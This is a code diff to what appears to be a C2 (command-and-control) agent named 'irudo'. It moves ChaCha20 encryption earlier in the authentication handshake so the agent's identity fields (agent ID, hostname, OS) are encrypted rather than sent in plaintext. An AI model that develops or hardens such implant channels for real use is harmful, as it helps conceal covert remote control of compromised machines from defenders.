@@ -250,8 +250,9 @@ static void gen_nonce(char *out, size_t outsz) {
  *    yet, so identity is not leaked before authentication).
  * 2. Receive register_response = sha256(nonce + c2_auth_tokens).
  * 3. Verify the hash locally; on mismatch return -1 (disconnect).
- * 4. On success send register_confirm now carrying the identity fields
- *    (agent_id, hostname, os). Returns 0 on success, -1 on failure. */
+ * 4. On success switch to ChaCha20 and send register_confirm now carrying the
+ *    identity fields (agent_id, hostname, os); the confirm is ENCRYPTED (the
+ *    first packet of the Agent -> C2 stream). Returns 0 on success, -1. */
 static int auth_handshake(sockfd_t sock, const opts *o, bytebuf_t *inbuf) {
     char nonce[40];
     gen_nonce(nonce, sizeof nonce);
@@ -293,6 +294,15 @@ static int auth_handshake(sockfd_t sock, const opts *o, bytebuf_t *inbuf) {
     if (strcmp(local, expected) != 0) {
         fprintf(stderr, "[irudo] auth verification failed (token mismatch)\n");
         return -1;
+    }
+
+    /* Auth succeeded: switch to ChaCha20 BEFORE sending the confirm so the
+     * identity fields in register_confirm are not sent in plaintext. The
+     * confirm is the first packet of the Agent -> C2 encrypted stream. */
+    {
+        uint8_t key[32];
+        sha256_digest((const uint8_t *)o->auth_token, strlen(o->auth_token), key);
+        crypto_enable_agent(key);
     }
 
     char hostbuf[256];
@@ -552,6 +562,10 @@ static int run(const opts *o) {
             continue;
         }
         fprintf(stderr, "[irudo] connected to %s:%d\n", o->c2_host, o->c2_port);
+        /* Reset any leftover encryption state from a previous connection; the
+         * register packet must be sent in plaintext. auth_handshake re-enables
+         * ChaCha20 once the challenge is verified (before the confirm). */
+        crypto_disable();
         bytebuf_t inbuf;
         bb_init(&inbuf);
         if (auth_handshake(sock, o, &inbuf) != 0) {
@@ -561,13 +575,6 @@ static int run(const opts *o) {
             sleep_sec(delay);
             if (delay * 2 <= (double)o->reconnect_max) delay *= 2;
             continue;
-        }
-        /* Handshake + auth succeeded: switch the whole stream to ChaCha20
-         * encryption keyed by sha256(auth_token). */
-        {
-            uint8_t key[32];
-            sha256_digest((const uint8_t *)o->auth_token, strlen(o->auth_token), key);
-            crypto_enable_agent(key);
         }
         int ret = serve(sock, o, &inbuf, &shutdown_flag);
         bb_free(&inbuf);
